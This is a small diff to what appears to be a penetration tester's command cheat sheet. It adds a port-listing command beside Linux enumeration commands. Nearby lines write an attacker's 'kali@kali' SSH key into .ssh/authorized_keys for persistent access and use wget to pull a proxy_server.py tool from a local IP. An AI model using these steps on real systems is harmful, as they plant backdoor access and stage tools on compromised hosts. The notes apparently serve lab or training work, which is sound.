@@ -37,7 +37,8 @@ linux OS
 	lsb_release -a
 	uname -a
 	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqWif+lFSqeO8C/FPp8Rchnc/FniJVTgYzzedThvyM/rmqSjUK1vbaYnK+gYIUAEbE6HMys5rz7exPZYwfcI39kyEmcSJp9uzbsljLFncbv/i7nmYVWOnnH44kNMojtmqeTaZtmouTb6CARe8ZkpwHNLDq8ACM3bSNq7dDYCgqvKs6xZhkitDOHBYraDAtJgAKYShE1LCsB4HIQyyowG5jQLl54QxBzcLH7ckbO6cR+VxH8idyeyA7lNCKqoYKHShTyCbFnWbv7lqta1dUsoo70I/4voXPYRndUGIwx9v84AzjxM2P1gVp5m7GljSGJWQzEgNmgbNclzWoHflGswXjgziG1t2zLXAuBorPsm9xcA+S06J/U7rCToqGJmcnfQox9n9+AH5dlVespwE4QfjIWN2MCfw9aRoTUzaQEa8u/VqkkQgEF09za3ucT1/sNLEcMqbq4SToXlENFaTV/JPOSFuiwYuwtfAGTmlVDzqF2DZH0EXJvtEFwRO6zLxWzmM= kali@kali" > .ssh/authorized_keys
-
+	lsof -i -P -n | grep LISTEN
+	
 file transfer
 	ftp> mget *
 	wget http://192.168.1.23:2000/proxy_server.py
